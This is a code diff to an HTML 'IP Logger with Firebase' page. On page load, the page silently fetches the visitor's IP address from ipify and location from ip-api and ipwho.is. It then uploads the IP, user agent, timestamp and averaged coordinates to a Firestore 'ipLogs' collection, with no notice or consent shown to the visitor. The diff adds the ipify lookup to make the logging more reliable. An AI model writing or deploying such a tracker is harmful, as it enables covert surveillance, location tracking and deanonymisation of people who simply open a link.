@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>IP Logger with Firebase (multi API)</title>
+  <title>IP Logger with Firebase (multi API + IP fetch)</title>
   <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
 </head>
@@ -20,6 +20,20 @@
 
   firebase.initializeApp(firebaseConfig);
   const db = firebase.firestore();
+
+  // Fetch IP from ipify.org
+  function fetchMyIP() {
+    return fetch('https://api.ipify.org?format=json')
+      .then(res => res.json())
+      .then(data => {
+        console.log('IP from ipify:', data.ip);
+        return data.ip || null;
+      })
+      .catch(err => {
+        console.error('Failed to fetch IP from ipify:', err);
+        return null;
+      });
+  }
 
   // Helper: fetch from an API and return location info
   function fetchLocation(url, parser) {
@@ -56,24 +70,28 @@
     };
   }
 
+  // Run all
   Promise.all([
+    fetchMyIP(),
     fetchLocation('https://ip-api.com/json/', parseIpApi),
     fetchLocation('https://ipwho.is/', parseIpWhoIs)
-  ]).then(results => {
-    const validResults = results.filter(r => r !== null);
+  ]).then(([ip, loc1, loc2]) => {
+    const validLocations = [loc1, loc2].filter(l => l !== null);
 
-    if (validResults.length === 0) {
-      document.body.innerHTML = "<p>Failed to fetch location from all APIs.</p>";
+    if (!ip && validLocations.length === 0) {
+      document.body.innerHTML = "<p>Failed to get IP or location data.</p>";
       return;
     }
 
-    const ip = validResults.find(r => r.ip) ? validResults.find(r => r.ip).ip : "unknown";
+    // Use IP from ipify if available, else fallback to location IPs, else unknown
+    const finalIP = ip || (validLocations.find(l => l.ip) ? validLocations.find(l => l.ip).ip : "unknown");
 
+    // Average lat/lon
     let latSum = 0, lonSum = 0, count = 0;
-    validResults.forEach(r => {
-      if (r.lat !== null && r.lon !== null) {
-        latSum += r.lat;
-        lonSum += r.lon;
+    validLocations.forEach(loc => {
+      if (loc.lat !== null && loc.lon !== null) {
+        latSum += loc.lat;
+        lonSum += loc.lon;
         count++;
       }
     });
@@ -83,10 +101,10 @@
     const ua = navigator.userAgent;
     const time = new Date().toISOString();
 
-    console.log("Saving to Firestore:", {ip, userAgent: ua, timestamp: time, latitude: avgLat, longitude: avgLon});
+    console.log("Saving to Firestore:", {ip: finalIP, userAgent: ua, timestamp: time, latitude: avgLat, longitude: avgLon});
 
     db.collection('ipLogs').add({
-      ip: ip,
+      ip: finalIP,
       userAgent: ua,
       timestamp: time,
       latitude: avgLat,
@@ -96,9 +114,6 @@
     }).catch(err => {
       document.body.innerHTML = "<p>Error logging IP/location: " + err + "</p>";
     });
-
-  }).catch(err => {
-    document.body.innerHTML = "<p>Unexpected error: " + err + "</p>";
   });
 </script>
 </body>
